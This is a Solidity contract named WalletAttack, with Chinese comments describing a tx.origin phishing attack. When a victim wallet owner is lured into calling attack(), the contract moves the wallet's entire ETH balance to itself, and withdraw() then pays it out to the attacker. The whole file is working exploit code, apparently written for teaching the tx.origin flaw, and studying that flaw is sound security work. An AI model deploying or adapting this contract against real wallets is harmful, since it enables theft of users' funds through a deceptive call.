// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "./Wallet.sol";

/**
 * WalletAttack - tx.origin 攻击合约
 * 
 * 攻击原理：
 * 利用 Alice 对 Wallet 的信任，通过中间合约发起攻击
 * 
 * 攻击流程：
 * 1. Alice（钱包所有者）调用 WalletAttack.attack()
 * 2. WalletAttack 调用 Wallet.transfer(attackContract, allBalance)
 * 3. 在 Wallet.transfer() 中：
 *    - msg.sender = WalletAttack 合约地址
 *    - tx.origin = Alice（原始发起者）
 * 4. require(tx.origin == owner) 成立（Alice == Alice）
 * 5. 攻击成功，ETH 转到攻击合约
 */
contract WalletAttack {
    Wallet public wallet;
    address public attacker;
    
    constructor(Wallet _wallet) {
        wallet = _wallet;
        attacker = msg.sender;
    }
    
    /**
     * attack - 发起攻击
     * 
     * 注意：调用这个函数的必须是钱包所有者
     */
    function attack() public {
        // 转走钱包里所有的 ETH 到攻击合约
        wallet.transfer(payable(address(this)), wallet.getBalance());
    }
    
    /**
     * withdraw - 从攻击合约提取资金到攻击者账户
     */
    function withdraw() public {
        require(msg.sender == attacker, "Only attacker can withdraw");
        payable(attacker).transfer(address(this).balance);
    }
    
    /**
     * 接收 ETH
     */
    receive() external payable {}
    
    /**
     * 查看攻击合约余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}